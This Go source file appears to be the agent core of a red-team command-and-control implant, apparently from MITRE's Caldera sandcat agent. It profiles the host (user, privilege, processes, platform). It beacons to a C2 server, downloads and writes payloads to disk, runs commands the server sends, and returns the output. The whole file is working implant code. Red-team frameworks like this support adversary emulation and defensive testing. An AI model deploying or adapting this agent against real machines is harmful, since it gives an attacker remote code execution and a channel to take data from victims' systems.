package agent

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"reflect"
	"runtime"
	"time"

	//"github.com/mitre/gocat/privdetect"
	//"github.com/mitre/gocat/executors/execute"
	//"github.com/mitre/gocat/util"
	//"github.com/mitre/gocat/contact"
	//"github.com/mitre/sandcat/gocat/output"
	"../privdetect"
	"../executors/execute"
	"../util"
	"../contact"
	"../output"
)

type AgentInterface interface {
	Heartbeat()
	Beacon() map[string]interface{}
	Initialize(server string, group string, heartbeatChannel string, beaconChannel string, enableP2pReceivers bool)
	Run()
	Terminate()
	GetFullProfile() map[string]interface{}
	GetTrimmedProfile() map[string]interface{}
}

// Implements AgentInterface
type Agent struct {
	// Profile fields
	server string
	group string
	host string
	username string
	architecture string
	platform string
	location string
	pid int
	ppid int
	executors []string
	privilege string
	exe_name string
	paw string

	// Communication methods
	beaconContact contact.Contact
	heartbeatContact contact.Contact

	// peer-to-peer info
	enableP2pReceivers bool
}

// Set up agent variables.
func (a *Agent) Initialize(server string, group string, heartbeatMethod string, beaconMethod string, enableP2pReceivers bool) {
	host, _ := os.Hostname()
	user, err := user.Current()
	if err != nil {
		usernameBytes, err := exec.Command("whoami").CombinedOutput()
		if err != nil {
			a.username = string(usernameBytes)
		}
	} else {
		a.username = user.Username
	}
	a.server = server
	a.group = group
	a.host = host
	a.architecture = runtime.GOARCH
	a.platform = runtime.GOOS
	a.location = os.Args[0]
	a.pid = os.Getpid()
	a.ppid = os.Getppid()
	a.executors = execute.AvailableExecutors()
	a.privilege = privdetect.Privlevel()
	a.exe_name = filepath.Base(os.Args[0])
	a.enableP2pReceivers = enableP2pReceivers

	// Paw will get initialized after successful beacon.

	// Will want some additional error checking in the future.
	a.beaconContact = contact.CommunicationChannels[beaconMethod]
	a.heartbeatContact = contact.CommunicationChannels[heartbeatMethod]

	output.VerbosePrint(fmt.Sprintf("server=%s", a.server))
	output.VerbosePrint(fmt.Sprintf("group=%s", a.group))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", a.privilege))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", beaconMethod))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", heartbeatMethod))
	output.VerbosePrint(fmt.Sprintf("allow p2p receivers=%v", a.enableP2pReceivers))
}

// Returns full profile for agent.
func (a *Agent) GetFullProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"group": a.group,
		"host": a.host,
		"username": a.username,
		"architecture": a.architecture,
		"platform": a.platform,
		"location": a.location,
		"pid": a.pid,
		"ppid": a.ppid,
		"executors": a.executors,
		"privilege": a.privilege,
		"exe_name": a.exe_name,
	}
}

// Return minimal subset of agent profile.
func (a *Agent) GetTrimmedProfile() map[string]interface{} {
	return map[string]interface{}{
		"paw": a.paw,
		"server": a.server,
		"platform": a.platform,
		"host": a.host,
	}
}

// Runs main loop.
func (a *Agent) Run() {
	watchdog := 0
	checkin := time.Now()
	for {
		// Send beacon and get response.
		beacon := a.Beacon()

		// Process beacon response.
		if len(beacon) != 0 {
			a.paw = beacon["paw"].(string)
			checkin = time.Now()

			// We have established comms. Run p2p receivers if allowed.
			// TODO
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				droppedPayloads := a.downloadPayloads(command["payloads"].([]interface{}))
				go a.runInstruction(command, droppedPayloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				watchdog = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
			util.EvaluateWatchdog(checkin, watchdog)
		}

		// Run command if needed

		// Send results if needed
	}
}

// Pings C2 for instructions and returns them.
func (a *Agent) Beacon() map[string]interface{} {
	var beacon map[string]interface{}
	if a.beaconContact != nil {
		profile := a.GetFullProfile()
		if profile != nil {
			response := a.beaconContact.GetBeaconBytes(profile)
			if response != nil {
				output.VerbosePrint("[+] beacon: ALIVE")
				var commands interface{}
				json.Unmarshal(response, &beacon)
				json.Unmarshal([]byte(beacon["instructions"].(string)), &commands)
				beacon["sleep"] = int(beacon["sleep"].(float64))
				beacon["watchdog"] = int(beacon["watchdog"].(float64))
				beacon["instructions"] = commands
			} else {
				output.VerbosePrint("[-] beacon: DEAD")
			}
		}
	}
	return beacon
}

func (a *Agent) Heartbeat() {
	// TODO
}

// Will download each individual payload listed, write them to disk,
// and will return the full file paths of each downloaded payload.
func (a *Agent) downloadPayloads(payloads []interface{}) []string {
	var droppedPayloads []string
	availablePayloads := reflect.ValueOf(payloads)
	for i := 0; i < availablePayloads.Len(); i++ {
		payload := availablePayloads.Index(i).Elem().String()
		location := filepath.Join(payload)
		obtainedPayload := false
		if util.Exists(location) == false {
			payloadBytes := a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
			if len(payloadBytes) > 0 {
				util.WritePayloadBytes(location, payloadBytes)
				obtainedPayload = true
			}
		} else {
			obtainedPayload = true
		}
		if obtainedPayload {
			droppedPayloads = append(droppedPayloads, location)
		}
	}
	return droppedPayloads
}

// Runs a single instruction and send results.
func (a *Agent) runInstruction(command map[string]interface{}, payloads []string) {
	timeout := int(command["timeout"].(float64))
	result := make(map[string]interface{})
	output, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
 	a.beaconContact.SendExecutionResults(a.GetTrimmedProfile(), result)
}